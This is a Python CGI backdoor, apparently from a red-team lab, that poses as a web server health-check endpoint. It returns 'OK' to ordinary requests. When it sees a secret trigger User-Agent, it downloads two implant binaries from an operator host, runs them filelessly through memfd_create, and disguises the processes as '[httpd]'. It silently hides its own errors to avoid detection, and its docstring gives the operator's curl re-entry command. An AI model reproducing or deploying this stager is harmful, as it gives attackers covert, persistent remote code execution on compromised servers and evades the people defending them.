#!/usr/bin/env python3
"""health_check.cgi -- dormant stager dropped on the apache target.

Uploaded by advanced_webserver_post_exploit_enum.py into
``/usr/local/apache2/cgi-bin/`` as a T1505.003 persistence mechanism. The
file looks like a routine "health check" endpoint to anyone glancing at the
cgi-bin directory:

  $ curl http://apache/cgi-bin/health_check.cgi
  OK

But when invoked with the trigger User-Agent it re-runs the in-memory loader
(the same ``memfd_create`` + ``execve "[httpd]"`` pattern the initial
exploit uses) and respawns the Sliver implants without going through the
CVE path-traversal again. The trigger gives the attacker a clean re-entry
even if the original implant is killed.

  # operator re-entry from kali:
  curl -A 'ReSpawnHttpdCache/1.0' http://router/cgi-bin/health_check.cgi
"""
import os
import sys

# Hard-coded trigger User-Agent. Anything else returns the benign 200 OK.
TRIGGER_UA = "ReSpawnHttpdCache/1.0"

# Where the implant binaries live on the operator host.
KALI_HOST = "10.10.0.2"
KALI_PORT = 8000


def _benign_response():
    """Write a plausible health-check response and exit so the CGI looks normal."""
    sys.stdout.write("Content-Type: text/plain\n\n")
    sys.stdout.write("OK")
    sys.exit(0)


def _respawn_implants():
    """Re-run the in-memory loader: fetch both implants, drop them into
    memfd-backed file descriptors, fork and execve as ``[httpd]``.

    On any error the stager silently falls back to the benign response so
    accidental misuse from a probing scanner doesn't expose the mechanism.
    """
    try:
        import urllib.request
        import ctypes
        libc = ctypes.CDLL(None)
        for binary in ("session_implant", "beacon_implant"):
            url = f"http://{KALI_HOST}:{KALI_PORT}/{binary}"
            with urllib.request.urlopen(url, timeout=5) as r:
                data = r.read()
            fd = libc.syscall(319, b"httpd_cache", 1)
            if fd >= 0:
                os.write(fd, data)
                if os.fork() == 0:
                    os.execve(f"/proc/self/fd/{fd}", ["[httpd]"], os.environ)
                    sys.exit(0)
    except Exception:
        pass
    _benign_response()


def main():
    if os.environ.get("HTTP_USER_AGENT", "") == TRIGGER_UA:
        _respawn_implants()
    _benign_response()


if __name__ == "__main__":
    main()
